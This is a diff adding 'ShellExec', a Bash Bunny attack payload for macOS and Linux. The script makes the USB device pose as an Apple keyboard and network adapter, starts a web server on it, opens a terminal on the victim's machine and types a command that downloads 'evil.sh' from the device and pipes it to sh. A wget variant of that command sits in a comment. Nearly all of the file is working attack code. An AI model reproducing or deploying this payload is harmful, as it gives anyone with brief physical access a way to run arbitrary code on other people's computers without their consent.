@@ -1,0 +1,53 @@
+#!/bin/bash
+
+# Title:     ShellExec
+# Author:    audibleblink
+# Target:    Mac/Linux
+# Version:   1.1
+#
+# Create a web server on the BashBunny and force
+# the victim to download and execute a script.
+# Perfect for when mass storage isn't an option.
+#
+# White            |  Ready
+# Ammber blinking  |  Waiting for server
+# Blue blinking    |  Attacking
+# Green            |  Finished
+
+LED SETUP
+ATTACKMODE ECM_ETHERNET HID VID_0X05AC PID_0X021E
+
+GET SWITCH_POSITION
+GET HOST_IP
+
+payload_dir=/root/udisk/payloads/$SWITCH_POSITION
+log_file=$payload_dir/shellexec.log
+
+cd $payload_dir
+
+# starting server
+LED SPECIAL
+
+# disallow outgoing dns requests so server starts immediately
+iptables -A OUTPUT -p udp --dport 53 -j DROP
+python -m SimpleHTTPServer 80
+
+# wait until port is listening
+while ! nc -z localhost 80; do sleep 0.2; done
+
+# attack commences
+LED ATTACK
+
+# macOS
+QUACK RUN OSX terminal
+QUACK DELAY 2000
+
+# ubunutu
+# QUACK RUN UNITY xterm
+# QUACK DELAY 2000
+
+QUACK STRING curl "http://$HOST_IP/evil.sh" \| sh
+# in case curl isn't installed
+# QUACK STRING wget -O - "http://$HOST_IP/evil.sh" \| sh 
+QUACK ENTER
+LED SUCCESS
